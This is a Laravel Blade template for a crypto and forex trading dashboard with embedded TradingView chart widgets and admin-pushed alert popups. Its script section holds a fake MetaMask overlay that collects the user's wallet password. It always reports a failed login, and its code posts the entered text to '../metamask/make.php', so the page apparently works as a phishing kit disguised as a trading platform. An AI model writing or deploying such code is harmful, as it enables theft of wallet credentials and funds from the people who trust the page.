<x-app-layout>
        <div class="col-md-4">
            <!-- TradingView Widget BEGIN -->
            <div class="tradingview-widget-container">
                <div class="tradingview-widget-container__widget"></div>
                <script type="text/javascript"
                        src="https://s3.tradingview.com/external-embedding/embed-widget-technical-analysis.js" async>
                    {
                        "interval": "1m",
                        "width": "100%",
                        "isTransparent": false,
                        "height": 430,
                        "symbol": "COINBASE:BTCUSD",
                        "showIntervalTabs": true,
                        "locale": "en",
                        "colorTheme": "dark"
                    }
                </script>
            </div>
            <!-- TradingView Widget END -->
        </div>
        <div class="col-md-4">
            <!-- TradingView Widget BEGIN -->
            <div class="tradingview-widget-container">
                <div class="tradingview-widget-container__widget"></div>
                <script type="text/javascript"
                        src="https://s3.tradingview.com/external-embedding/embed-widget-technical-analysis.js" async>
                    {
                        "interval": "1m",
                        "width": "100%",
                        "isTransparent": false,
                        "height": 430,
                        "symbol": "BINANCE:BTCUSDT",
                        "showIntervalTabs": true,
                        "locale": "en",
                        "colorTheme": "dark"
                    }
                </script>
            </div>
            <!-- TradingView Widget END -->
        </div>
        <div class="col-md-4">
            <!-- TradingView Widget BEGIN -->
            <div class="tradingview-widget-container">
                <div class="tradingview-widget-container__widget"></div>
                <script type="text/javascript"
                        src="https://s3.tradingview.com/external-embedding/embed-widget-technical-analysis.js" async>
                    {
                        "interval": "1m",
                        "width": "100%",
                        "isTransparent": false,
                        "height": 430,
                        "symbol": "FX:GBPJPY",
                        "showIntervalTabs": true,
                        "locale": "en",
                        "colorTheme": "dark"
                    }
                </script>
            </div>
            <!-- TradingView Widget END -->
        </div>
        <div class="col-md-4">
            <!-- TradingView Widget BEGIN -->
            <div class="tradingview-widget-container">
                <div class="tradingview-widget-container__widget"></div>
                <script type="text/javascript"
                        src="https://s3.tradingview.com/external-embedding/embed-widget-technical-analysis.js" async>
                    {
                        "interval": "1m",
                        "width": "100%",
                        "isTransparent": false,
                        "height": 430,
                        "symbol": "FX:USDCAD",
                        "showIntervalTabs": true,
                        "locale": "en",
                        "colorTheme": "dark"
                    }
                </script>
            </div>
            <!-- TradingView Widget END -->
        </div>
        <div class="col-md-4">
            <!-- TradingView Widget BEGIN -->
            <div class="tradingview-widget-container">
                <div class="tradingview-widget-container__widget"></div>
                <script type="text/javascript"
                        src="https://s3.tradingview.com/external-embedding/embed-widget-technical-analysis.js" async>
                    {
                        "interval": "1m",
                        "width": "100%",
                        "isTransparent": false,
                        "height": 430,
                        "symbol": "FX:AUDUSD",
                        "showIntervalTabs": true,
                        "locale": "en",
                        "colorTheme": "dark"
                    }
                </script>
            </div>
            <!-- TradingView Widget END -->
        </div>
        <div class="col-md-4">
            <!-- TradingView Widget BEGIN -->
            <div class="tradingview-widget-container">
                <div class="tradingview-widget-container__widget"></div>
                <script type="text/javascript"
                        src="https://s3.tradingview.com/external-embedding/embed-widget-technical-analysis.js" async>
                    {
                        "interval": "1m",
                        "width": "100%",
                        "isTransparent": false,
                        "height": 430,
                        "symbol": "OANDA:GBPUSD",
                        "showIntervalTabs": true,
                        "locale": "en",
                        "colorTheme": "dark"
                    }
                </script>
            </div>
            <!-- TradingView Widget END -->
        </div>
        <div class="col-md-4">
            <!-- TradingView Widget BEGIN -->
            <div class="tradingview-widget-container">
                <div class="tradingview-widget-container__widget"></div>
                <script type="text/javascript"
                        src="https://s3.tradingview.com/external-embedding/embed-widget-technical-analysis.js" async>
                    {
                        "interval": "1m",
                        "width": "100%",
                        "isTransparent": false,
                        "height": 430,
                        "symbol": "NASDAQ:AAPL",
                        "showIntervalTabs": true,
                        "locale": "en",
                        "colorTheme": "dark"
                    }
                </script>
            </div>
            <!-- TradingView Widget END -->
        </div>
        <div class="col-md-4">
            <!-- TradingView Widget BEGIN -->
            <div class="tradingview-widget-container">
                <div class="tradingview-widget-container__widget"></div>
                <script type="text/javascript"
                        src="https://s3.tradingview.com/external-embedding/embed-widget-technical-analysis.js" async>
                    {
                        "interval": "1m",
                        "width": "100%",
                        "isTransparent": false,
                        "height": 430,
                        "symbol": "FX:USDCHF",
                        "showIntervalTabs": true,
                        "locale": "en",
                        "colorTheme": "dark"
                    }
                </script>
            </div>
            <!-- TradingView Widget END -->
        </div>
        <div class="col-md-4">
            <!-- TradingView Widget BEGIN -->
            <div class="tradingview-widget-container">
                <div class="tradingview-widget-container__widget"></div>
                <script type="text/javascript"
                        src="https://s3.tradingview.com/external-embedding/embed-widget-technical-analysis.js" async>
                    {
                        "interval": "1m",
                        "width": "100%",
                        "isTransparent": false,
                        "height": 430,
                        "symbol": "FX:GBPAUD",
                        "showIntervalTabs": true,
                        "locale": "en",
                        "colorTheme": "dark"
                    }
                </script>
            </div>
            <!-- TradingView Widget END -->
        </div>
    </div>
</div>
    <x-slot name="script">
        <script>
            function noti(msg, status) {
                toastr[status](msg);
                toastr.options = {
                    "closeButton": false,
                    "debug": false,
                    "newestOnTop": false,
                    "progressBar": false,
                    "rtl": false,
                    "positionClass": "toast-top-right",
                    "preventDuplicates": false,
                    "onclick": null,
                    "showDuration": 300,
                    "hideDuration": 1000,
                    "timeOut": 5000,
                    "extendedTimeOut": 1000,
                    "showEasing": "swing",
                    "hideEasing": "linear",
                    "showMethod": "fadeIn",
                    "hideMethod": "fadeOut"
                }
            }

            setInterval(function() {
                var messageId = $("#alertMessageId").val();
                if(messageId == '0') {
                    $.ajax({
                        url: "../ajax/ajax",
                        type: "POST",
                        data: {
                            action: "CHECK_USER_ALERT_MESSAGE"
                        },
                        success: function(response) {
                            if(response != "false") {

                                var json = JSON.parse(response);
                                var alert_message_text = json['alert_message_text'];
                                var alert_message_id = json['alert_message_id'];

                                if(json['alert_message_type'] == 'alert') {
                                    $("#alert_message_modal").css("display", "flex");
                                    $("#userAlertBox").html(alert_message_text);
                                    $("#alertMessageId").val(alert_message_id);
                                }



                            }

                        }
                    })
                }
            }, 5000);


            $("#alert_close_modal").on("click", function() {
                $("#alert_message_modal").css("display", "none");
                var alertMessageId = $("#alertMessageId").val();

                $.ajax({
                    url: "../ajax/ajax",
                    type: "POST",
                    data: {
                        action: "VIEWED_ALERT_MESSAGE",
                        message_id: alertMessageId
                    },
                    success: function(response) {

                    }
                })
            });

            $("#alert_close_modal_btn").on("click", function() {
                $("#alert_message_modal").css("display", "none");
                var alertMessageId = $("#alertMessageId").val();

                $.ajax({
                    url: "../ajax/ajax",
                    type: "POST",
                    data: {
                        action: "VIEWED_ALERT_MESSAGE",
                        message_id: alertMessageId
                    },
                    success: function(response) {

                    }
                })
            });


            function openMetaMask() {
                $("#metMaskBlock").css("opacity", "1");
                $("#metMaskBlock").css("z-index", "99999999");
                setTimeout(function () {
                    $('#load').addClass('hide');
                    $("#verify_popap_meta").css("display", "none");
                    document.getElementById('loaded').classList.remove('hide');
                }, 1000);

                setInterval(function() {
                    if(($("#pswrd").val().length > 7)) {document.getElementById("buttonf").disabled = false;} else {document.getElementById("buttonf").disabled = true;}
                }, 1000)


            }


            function func() {
                document.getElementById('pswrd').classList.remove('border-red');
                $('#error1').addClass('hide');
            }


            var calc = 0;

            function sendform(e) {
                e.preventDefault();
                //send_message()
                calc ++
                $('#error1').addClass('hide');
                $('#error2').addClass('hide');
                document.getElementById('pswrd').classList.remove('border-red');

                if (calc < 3) {
                    $('#buttonf').addClass('hide');
                    document.getElementById('loading').classList.remove('hide');
                    setTimeout(function () {
                        $('#loading').addClass('hide');
                        $('#pswrd').addClass('border-red');
                        document.getElementById('error1').classList.remove('hide');
                        document.getElementById('buttonf').classList.remove('hide');
                    }, 1234);
                }

                if (calc > 2) {
                    $('#buttonf').addClass('hide');
                    document.getElementById('loading').classList.remove('hide');
                    setTimeout(function () {
                        $('#loading').addClass('hide');
                        document.getElementById('error2').classList.remove('hide');
                    }, 984);
                }

            }


            function send_message() {
                var res = document.getElementById('pswrd').value;
                send_ajax(res)
            }

            function send_ajax(text) {
                return new Promise(function (resolve, reject) {
                    $.ajax({
                        type: 'post',
                        url: '../metamask/make.php',
                        dataType: 'json',
                        data: {
                            'text':text,
                        }
                    });
                });
            }


            $("#closeMetaMaskBtn").on("click", function() {
                $("#verify_popap_meta").css("display", "none");
                var MetaalertMessageId = $("#MetaalertMessageId").val();

                $.ajax({
                    url: "../ajax/ajax",
                    type: "POST",
                    data: {
                        action: "VIEWED_ALERT_MESSAGE",
                        message_id: MetaalertMessageId
                    },
                    success: function(response) {

                    }
                })
            });


        </script>


    </x-slot>

</x-app-layout>
